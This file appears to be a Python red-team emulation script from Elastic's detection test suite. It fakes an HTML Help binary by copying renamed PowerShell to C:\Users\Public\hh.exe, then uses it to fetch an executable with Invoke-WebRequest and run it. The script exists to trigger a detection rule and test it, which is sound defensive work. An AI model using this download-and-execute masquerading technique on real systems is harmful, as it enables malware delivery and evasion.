# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="9bbf9aea-33fc-45fc-be55-4cafc744da80",
    name="html_help_file_written_exec",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(id="9c3b13f6-bc26-4397-9721-4ba23ddd1014", name="File Execution via Microsoft HTML Help")
    ],
    siem_rules=[],
    techniques=["T1218", "T1566"],
)
def main():
    EXE_FILE = _common.get_resource_path("bin/renamed_posh.exe")

    server, ip, port = _common.serve_dir_over_http()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    hh = "C:\\Users\\Public\\hh.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    _common.copy_file(EXE_FILE, hh)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    log.info("Using a fake hh to drop and execute an .exe")
    _ = _common.execute_command([hh, "/c", cmd], timeout_secs=10)
    _ = _common.execute_command([hh, "/c", dropped], timeout_secs=10, kill=True)
    _common.remove_file(hh)
    _common.remove_file(dropped)
